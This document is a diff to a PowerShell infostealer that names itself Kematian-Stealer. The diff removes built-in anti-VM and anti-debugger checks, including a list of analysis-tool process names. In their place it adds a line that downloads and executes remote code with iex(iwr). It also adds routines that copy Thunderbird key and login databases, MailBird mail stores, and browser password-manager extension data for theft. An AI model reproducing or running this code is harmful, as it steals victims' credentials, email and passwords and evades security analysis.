@@ -100,235 +100,11 @@ function Invoke-TASKS {
     Backup-Data
 }
 
-Add-Type -AssemblyName System.Windows.Forms
-
-function ShowError {
-    param([string]$errorName)
-    [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
-}
-
-function Search-Mac {
-    $pc_mac = &(gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
-    $pc_macs = $pc_mac -join ","
-    return $pc_macs
-}
-
-function Search-IP {
-    $pc_ip = &(gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseB
-    $pc_ip = $pc_ip.Content
-    return $pc_ip
-}
-
-function InternetCheck {
-    try {
-        $result = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
-        Write-Host "[!] Internet connection is active." -ForegroundColor Green
-    }
-    catch {
-    ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
-        Stop-Process $pid -Force
-    }
-}
-
-
-function ProcessCountCheck {
-    $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
-    if ($processes -lt 50) {
-        [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
-        Stop-Process $pid -Force
-    }
-}
-
-function RecentFileActivity {
-    $file_Dir = "$ENV:APPDATA/microsoft/windows/recent"
-    $file = Get-ChildItem -Path $file_Dir -Recurse
-    #if number of files is less than 20
-    if ($file.Count -lt 20) {
-        [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
-        Stop-Process $pid -Force
-    }
-}
-
-function TestDriveSize {
-    $drives = Get-Volume | Where-Object { $_.DriveLetter -ne $null } | Select-Object -ExpandProperty DriveLetter
-    $driveSize = 0
-    foreach ($drive in $drives) {
-        $driveSize += (Get-Volume -DriveLetter $drive).Size
-    }
-    $driveSize = $driveSize / 1GB
-    if ($driveSize -lt 50) {
-        [Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
-        Stop-Process $pid -Force
-    }
-
-}
-
-function Search-HWID {
-    $hwid = &(gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
-    return $hwid
-}
-
-function Search-Username {
-    $getuser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $username = $getuser.Split("\")[1]
-    return $username
-}
-
-function Invoke-ANTITOTAL {
-    $anti_functions = @(
-        "InternetCheck",
-        "ProcessCountCheck",
-        "RecentFileActivity",
-        "TestDriveSize"
-    )
-
-    #foreach ($func in $anti_functions) {
-    #    Invoke-Expression "$func"
-    #}
-    $urls = @(
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
-    )
-
-    $functions = @(
-        "Search-Mac",
-        "Search-IP",
-        "Search-HWID",
-        "Search-Username"
-    )
-
-    $data = @()
-    foreach ($func in $functions) {
-        $data += Invoke-Expression "$func"
-    }
-    foreach ($url in $urls) {
-        $blacklist = &(gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
-        if ($null -ne $blacklist) {
-            foreach ($item in $blacklist -split "`n") {
-                if ($data -contains $item) {
-                    ShowError $item
-                    Stop-Process $pid -Force
-                }
-            }
-        }
-    }
-}
-
-function ram_check {
-    $ram = (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
-    if ($ram -lt 6) {
-        ([System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error'))
-        Stop-Process $pid -Force
-    }
-}
-
-
 function VMPROTECT {
-    if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
-    ram_check           
-    #triage detection
-    $d = wmic diskdrive get model
-    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
-        ShowError "QEMU HARDDISK"
-        Stop-Process $pid -Force
-    }    
-    $processNames = @(
-        "32dbg",
-        "64dbgx",
-        "autoruns",
-        "autoruns64",
-        "autorunsc",
-        "autorunsc64",
-        "ciscodump",
-        "df5serv",
-        "die",
-        "dumpcap",
-        "efsdump",
-        "etwdump",
-        "fakenet",
-        "fiddler",
-        "filemon",
-        "hookexplorer",
-        "httpdebugger",
-        "httpdebuggerui",
-        "ida",
-        "ida64",
-        "idag",
-        "idag64",
-        "idaq",
-        "idaq64",
-        "idau",
-        "idau64",
-        "idaw",
-        "immunitydebugger",
-        "importrec",
-        "joeboxcontrol",
-        "joeboxserver",
-        "ksdumperclient",
-        "lordpe",
-        "ollydbg",
-        "pestudio",
-        "petools",
-        "portmon",
-        "prl_cc",
-        "prl_tools",
-        "proc_analyzer",
-        "processhacker",
-        "procexp",
-        "procexp64",
-        "procmon",
-        "procmon64",
-        "qemu-ga",
-        "qga",
-        "regmon",
-        "reshacker",
-        "resourcehacker",
-        "sandman",
-        "sbiesvc",
-        "scylla",
-        "scylla_x64",
-        "scylla_x86",
-        "sniff_hit",
-        "sysanalyzer",
-        "sysinspector",
-        "sysmon",
-        "tcpdump",
-        "tcpview",
-        "tcpview64",
-        "udpdump",
-        "vboxcontrol",
-        "vboxservice",
-        "vboxtray",
-        "vgauthservice",
-        "vm3dservice",
-        "vmacthlp",
-        "vmsrvc",
-        "vmtoolsd",
-        "vmusrvc",
-        "vmwaretray",
-        "vmwareuser",
-        "vt-windows-event-stream",
-        "windbg",
-        "wireshark",
-        "x32dbg",
-        "x64dbg",
-        "x96dbg",
-        "xenservice"
-    )
-    $foundProcesses = gps | Where-Object { $processNames -contains $_.Name.ToLower() } | Select-Object -ExpandProperty Name
-    if ($null -ne $foundProcesses) {
-        Write-Host "[!] Found the following processes:" -ForegroundColor Red
-        $foundProcesses -join "`n" | Write-Host
-        ShowError $foundProcesses
-        Stop-Process $pid -Force
-    }  
-    if ($null -eq $foundProcesses) {
-        Invoke-ANTITOTAL
-    }
+    $link = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/antivm.ps1")
+    iex (iwr -uri $link -useb)
+    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
 }
-
 if ($vm_protect) {
     VMPROTECT
 }
@@ -373,8 +149,9 @@ function Backup-Data {
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
     $ftp_clients = "$folderformat\FTP Clients"
+    $password_managers = "$folderformat\Password Managers" 
 
-    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients)
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $password_managers)
     foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
@@ -422,7 +199,7 @@ function Backup-Data {
     $guidString = $guid.ToString()
     $suffix = $guidString.Substring(0, 8)  
     $prefixedGuid = "Kematian-Stealer-" + $suffix
-    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilZcgICDilojilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4pWXICAg4paI4paI4pWXICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4pWXICAgICDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgIOKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcgICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkSAgICDilojilojilojilojilojilojilojilZcgICDilojilojilZEgICDilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWR4pWa4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIOKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQ0K")
+    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZHilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilZcgICDilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlyDilZENCuKVkeKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZfilZENCuKVkeKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilojilojilojilojilojilZcgIOKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWXICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4pWRDQrilZHilojilojilZTilZDilojilojilZcg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilZrilojilojilZfilojilojilZEgICAg4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWRDQrilZHilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKVkQ0K4pWR4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnSAgICDilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHR0cHM6Ly9naXRodWIuY29tL1NvbWFsaS1EZXZzL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd")
     $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
     $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
     
@@ -472,22 +249,30 @@ function Backup-Data {
     function diskdata {
         $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
         $results = foreach ($disk in $disks) {
-            $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
-            $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
-            $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
-            $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
-            $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
+            try {
+                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
+                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
+                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
+                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
+                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
+            }
+            catch {
+                $SizeOfDisk = 0
+                $FreeSpace = 0
+                $FreePercent = 0
+                $usedspace = 0
+                $usedpercent = 0
+            }
+
             [PSCustomObject]@{
                 Drive             = $disk.Name
                 "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                 "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                 "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
             }
-            Write-Output ""  
         }
         $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
     }
-    
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
     $alldiskinfo = $alldiskinfo.Trim()
 
@@ -577,7 +362,6 @@ function Backup-Data {
     }
     telegramstealer
 
-
     # Element  
     function elementstealer {
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
@@ -589,7 +373,6 @@ function Backup-Data {
     }
     elementstealer
 
-
     # ICQ  
     function icqstealer {
         $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
@@ -599,7 +382,6 @@ function Backup-Data {
         Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
     }
     icqstealer
-
 
     # Signal  
     function signalstealer {
@@ -804,7 +586,6 @@ function Backup-Data {
     }
     battle_net_stealer
 
-
     # All VPN Sessions
 
     # ProtonVPN
@@ -843,6 +624,43 @@ function Backup-Data {
         Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
     }
     openvpn_stealer
+    
+    # Thunderbird 
+    function thunderbirdbackup {
+    $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
+    if (!(Test-Path $thunderbirdfolder)) { return }
+    $thunderbirdbackup = "$folder_email\Thunderbird"
+    New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
+    $pattern = "^[a-z0-9]+\.default-esr$"
+    $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
+    $filter = @("key4.db","key3.db","logins.json","cert9.db","*.js")
+    foreach ($directory in $directories) {
+        $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
+        New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
+        foreach ($filePattern in $filter) {
+            Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
+                $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
+                $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
+                $destFileDir = Split-Path -Path $destFilePath -Parent
+                if (!(Test-Path -Path $destFileDir)) {
+                    New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
+                }
+                Copy-Item -Path $_.FullName -Destination $destFilePath -Force
+            }
+        }
+      }
+    }
+    thunderbirdbackup
+	
+    # MailBird
+    function mailbird_backup {
+        $mailbird_folder = "$env:localappdata\MailBird"
+        if (!(Test-Path $mailbird_folder)) { return }
+        $mailbird_db = "$folder_email\MailBird"
+        New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
+        Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
+    } 
+    mailbird_backup
 
     # FTP Clients 
 
@@ -965,12 +783,64 @@ function Backup-Data {
     }
     Get-WinSCPSessions
 
-    # Thunderbird Exfil
-    if (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
-        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
-        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
-        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
+    # Password Managers
+    function password_managers {
+    $browserPaths = @{
+        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
+        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
+        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
+        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
+        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
+        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
+        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
+        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
+        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
     }
+    $password_mgr_dirs = @{
+        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
+        "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
